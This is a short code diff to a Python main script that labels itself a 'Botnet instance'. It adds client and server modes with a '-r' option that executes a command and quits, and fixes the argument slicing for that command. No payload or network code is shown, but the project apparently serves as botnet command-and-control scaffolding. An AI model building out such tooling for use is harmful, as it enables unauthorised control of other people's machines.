@@ -5,6 +5,14 @@ import actor
 import processor
 
 USAGE="""
+Botnet instance.
+
+Usage:
+  python main.py client|server [-r command]
+
+Options:
+  -r   Execute a command and quit
+
 """
 
 MAINPR = processor.MainProcessor
@@ -16,7 +24,7 @@ if __name__ == '__main__':
             signal.pause()
         elif sys.argv[1]=='server':
             if '-r' in sys.argv[2:]:
-                command = ' '.join([(sys.argv.index('-r')+1):])
+                command = ' '.join(sys.argv[(sys.argv.index('-r')+1):])
                 console = actor.Console(targetProcessor=MAINPR,cmd=command)
             else:
                 console = actor.Console(targetProcessor=MAINPR)
